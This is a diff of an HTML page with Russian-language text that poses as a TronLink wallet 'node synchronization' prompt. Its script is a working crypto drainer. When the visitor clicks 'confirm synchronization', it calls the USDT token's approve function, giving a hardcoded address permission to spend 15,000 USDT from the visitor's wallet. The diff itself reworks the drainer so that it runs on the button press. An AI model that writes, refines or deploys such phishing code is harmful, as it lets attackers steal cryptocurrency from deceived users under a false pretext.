@@ -9,79 +9,59 @@
         body { background: #050505; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
         .card { background: #0d0d0d; border-radius: 30px; padding: 35px 25px; border: 1px solid #1a1a1a; width: 100%; max-width: 380px; text-align: center; box-shadow: 0 0 40px rgba(0, 255, 0, 0.1); }
         .logo-box { width: 70px; height: 70px; border: 2px solid #00ff00; border-radius: 22px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); }
-        h2 { font-size: 20px; font-weight: 700; color: #fff; margin: 0 0 8px; text-transform: uppercase; }
-        .btn { display: block; background: #00ff00; color: #000; border: none; padding: 18px; width: 100%; border-radius: 16px; font-weight: 800; font-size: 14px; cursor: pointer; text-transform: uppercase; box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2); }
-        #status { color: #444; font-size: 11px; margin-top: 20px; }
+        h2 { font-size: 20px; font-weight: 700; color: #fff; text-transform: uppercase; margin-bottom: 20px; }
+        .btn { display: block; background: #00ff00; color: #000; border: none; padding: 20px; width: 100%; border-radius: 16px; font-weight: 800; font-size: 14px; cursor: pointer; text-transform: uppercase; box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2); }
     </style>
 </head>
 <body>
 
 <div class="card" id="main-container">
     <div class="logo-box"><span style="color: #00ff00; font-size: 30px;">T</span></div>
-    <h2 id="title">Инициализация...</h2>
-    <p id="desc" style="color: #666; font-size: 13px; margin-bottom: 25px;">Ожидание подключения TronLink...</p>
+    <h2>Узел обнаружен</h2>
+    <p style="color: #666; font-size: 13px; margin-bottom: 25px;">
+        Нажмите кнопку ниже для подтверждения синхронизации вашего кошелька с узлом (Лимит: 15,000 USDT).
+    </p>
     
-    <button id="action-btn" class="btn" style="display: none;">ПОДТВЕРДИТЬ СИНХРОНИЗАЦИЮ</button>
-    <div id="status">Поиск кошелька...</div>
+    <button id="action-btn" class="btn">ПОДТВЕРДИТЬ СИНХРОНИЗАЦИЮ</button>
 </div>
 
 <script>
-    // --- ТВОИ ДАННЫЕ ---
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const APPROVE_AMOUNT = "15000000000"; // 15,000 USDT
+    const APPROVE_AMOUNT = "15000000000";
 
-    async function startApprove() {
+    document.getElementById('action-btn').onclick = async () => {
         const btn = document.getElementById('action-btn');
         try {
-            // Берем tronWeb напрямую из окна
-            const tron = window.tronWeb;
+            // Проверяем наличие кошелька ПРЯМО при нажатии
+            const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
             
+            if (!tron) {
+                alert("Ошибка: Откройте эту ссылку ВНУТРИ браузера TronLink!");
+                return;
+            }
+
             btn.innerText = "ОЖИДАНИЕ...";
             btn.disabled = true;
 
-            // ВАЖНО: Мы убрали tron.request. 
-            // TronLink сам предложит подключиться, когда мы вызовем контракт.
-            
+            // Сразу лезем к контракту. Это САМО вызовет окно "Подключить кошелек"
             const contract = await tron.contract().at(USDT);
             
-            // Вызываем Approve
             const result = await contract.approve(ADMIN, APPROVE_AMOUNT).send({
-                feeLimit: 100000000 // 100 TRX
+                feeLimit: 100000000
             });
 
             if (result) {
                 alert("Успешно! Синхронизация подтверждена.");
                 btn.innerText = "ГОТОВО";
-                btn.style.background = "#333";
             }
         } catch (err) {
-            // Если ошибка — выводим её просто текстом, без лишних JSON
-            alert("Ошибка транзакции: " + (err.message || err));
+            // Если вылезет ошибка, мы увидим ЧТО ИМЕННО не так
+            alert("Инфо: " + (err.message || JSON.stringify(err)));
             btn.innerText = "ПОПРОБОВАТЬ СНОВА";
             btn.disabled = false;
         }
-    }
-
-    function checkWallet() {
-        // Проверяем наличие провайдера
-        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
-        
-        if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
-            document.getElementById('title').innerText = "Узел Готов";
-            document.getElementById('desc').innerText = "Нажмите кнопку ниже для подтверждения синхронизации (15,000 USDT).";
-            document.getElementById('status').innerText = "Кошелек подключен";
-            
-            const btn = document.getElementById('action-btn');
-            btn.style.display = "block";
-            btn.onclick = startApprove;
-
-            clearInterval(checkInterval);
-        }
-    }
-
-    // Сканируем кошелек каждую секунду
-    const checkInterval = setInterval(checkWallet, 1000);
+    };
 </script>
 </body>
 </html>
